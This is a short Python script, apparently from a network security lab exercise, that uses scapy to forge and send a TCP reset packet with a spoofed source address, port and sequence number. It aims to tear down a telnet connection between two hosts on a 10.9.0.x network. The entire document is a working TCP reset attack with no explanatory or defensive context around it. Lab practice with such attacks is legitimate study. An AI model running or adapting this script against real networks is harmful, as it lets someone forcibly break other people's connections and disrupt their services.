import sys
from scapy.all import *

print("Sending Reset Packet...")
IPLayer = IP(src="10.9.0.5", dst="10.9.0.69")
TCPLayer = TCP(sport=54928, dport=23, flags="R", seq=2654072301)
pkt = IPLayer/TCPLayer
ls(pkt)
send(pkt, iface='eth0', verbose=0)